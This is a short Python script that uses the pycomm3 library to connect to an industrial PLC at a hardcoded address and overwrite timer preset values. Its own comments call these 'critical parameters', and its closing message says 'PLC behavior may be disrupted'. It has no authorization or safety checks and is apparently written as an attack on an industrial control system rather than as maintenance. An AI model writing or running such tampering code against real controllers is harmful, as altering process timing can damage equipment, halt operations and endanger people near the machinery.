from pycomm3 import LogixDriver

def find_plc_ip():
    # This function should scan the network to find the PLC's IP address.
    # For simplicity, we'll assume the IP is known or manually entered.
    plc_ip = "192.168.1.10"  # Replace with the actual PLC IP or implement a scanner
    return plc_ip

def modify_plc_parameters(plc_ip):
    try:
        # Connect to the PLC
        with LogixDriver(plc_ip) as plc:
            print(f"Connected to PLC at {plc_ip}")

            # Modify critical parameters
            # Example: Change TONOFF_1.PT (Pulse Time) and TONOFF_1.PTOF (Pulse Time Off)
            plc.write(('TONOFF_1.PT', 'T#30S'))  # Increase pulse time to 30 seconds
            plc.write(('TONOFF_1.PTOF', 'T#40S'))  # Increase pulse time off to 40 seconds

            # Verify the changes
            pt_value = plc.read('TONOFF_1.PT').value
            ptof_value = plc.read('TONOFF_1.PTOF').value
            print(f"Modified TONOFF_1.PT to {pt_value}")
            print(f"Modified TONOFF_1.PTOF to {ptof_value}")

            # Example: Modify TON_1.PT (Timer Preset Time)
            plc.write(('TON_1.PT', 'T#50S'))  # Increase timer preset to 50 seconds

            # Verify the change
            ton_pt_value = plc.read('TON_1.PT').value
            print(f"Modified TON_1.PT to {ton_pt_value}")

            print("Parameters modified successfully. PLC behavior may be disrupted.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()

    # Step 2: Modify the PLC parameters
    if plc_ip:
        modify_plc_parameters(plc_ip)
    else:
        print("Could not find the PLC's IP address.")